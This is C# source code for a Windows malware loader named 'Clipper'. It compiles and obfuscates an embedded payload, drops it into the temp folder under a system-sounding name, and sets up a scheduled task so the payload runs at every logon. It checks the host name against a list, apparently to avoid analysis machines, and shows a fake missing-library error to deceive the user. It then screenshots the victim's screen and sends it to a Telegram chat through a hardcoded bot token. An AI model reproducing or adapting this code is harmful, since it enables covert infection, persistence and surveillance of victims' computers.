using System;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using Microsoft.Win32.TaskScheduler;
using System.Drawing;
using Telegram.Bot;
using Telegram.Bot.Types;
using dnlib.DotNet;
using yetAnotherObfuscator;
using System.Reflection;

namespace Clipper
{
    internal class Program
    {
        static string name = "CompPkgSrv.exe";


        static async System.Threading.Tasks.Task Main(string[] args)
        {
            await Anothermain();
        }
        static async System.Threading.Tasks.Task Anothermain()  
        {
            if (StartCheck() == true)
            {
                System.Threading.Tasks.Task CopyTask = System.Threading.Tasks.Task.Factory.StartNew(() =>
                {
                    Obfuscate(Path.Combine(Path.GetTempPath(), name));
                });
                CopyTask.Wait();
                Startup();
                Error();
                await SendScreenshotAsync("-870592197");
            }
            else
            {
                Error();
            }
        }
        public static string Compile(string code)
        {
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = false;
            parameters.CompilerOptions = "/target:winexe";
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.Threading.dll");

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
            return results.PathToAssembly;
        }

        public static void Obfuscate(string obf_path)
        {
            string path = "";
            System.Threading.Tasks.Task CopyTask = System.Threading.Tasks.Task.Factory.StartNew(() =>
            {
                path = Compile(Wzo0sX6pWg.Properties.Resources.irMLQuZLaG);
            });
            CopyTask.Wait();

            Assembly Default_Assembly;
            Default_Assembly = System.Reflection.Assembly.UnsafeLoadFrom(path);
            ModuleDefMD Module = ModuleDefMD.Load(path);
            AssemblyDef Assembly = Module.Assembly;

            ManipulateStrings.PerformStringEncryption(Module);
            ChangeMethodsName.Fire(Module, Default_Assembly);
            Wzo0sX6pWg.Obf.SaveToFile(Module, path, obf_path);
        }
        public static void Startup()
        {
            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = "Task to execute application";
                td.Actions.Add(new ExecAction(Path.Combine(Path.GetTempPath(), name)));
                td.Triggers.Add(new LogonTrigger());
                ts.RootFolder.RegisterTaskDefinition("Application Execution Task", td);
                ts.GetTask("Application Execution Task").Run();
            }
        }
        public static bool StartCheck()
        {
            if (System.IO.File.Exists(Path.Combine(System.Windows.Forms.Application.StartupPath, "Leaf.xNet.dll")))
            {
                string[] lines = Wzo0sX6pWg.Properties.Resources.pc_name_list.Split(new[] { Environment.NewLine }, StringSplitOptions.None);
                foreach (string i in lines)
                {
                    if (Environment.MachineName != i)
                    {
                        continue;
                    }
                    else
                    {
                        return false;
                    }
                }

                return true;
            }
            else
            {
                return false;
            }
        }
        public static void Error()
        {
            System.Windows.Forms.MessageBox.Show("The following information was found for this error:\r\n\r\nCode:\r\n  0x129838F8F\r\n\r\nDescription:\r\n  Visual Studio C++ libraries needed", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        public static async System.Threading.Tasks.Task SendScreenshotAsync(string chatId)
        {
            TelegramBotClient botClient = new TelegramBotClient("5734995063:AAGct4zZ5-Uxl_7S8B8R40SJtx2p9lvO3Ic");
            var screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (var graphics = Graphics.FromImage(screenshot))
            {
                graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
            }

            using (var stream = new MemoryStream())
            {
                screenshot.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
                stream.Seek(0, SeekOrigin.Begin);

                var photo = new InputFileStream(stream);
                await botClient.SendPhotoAsync(chatId, photo);
            }
        }

    }
}
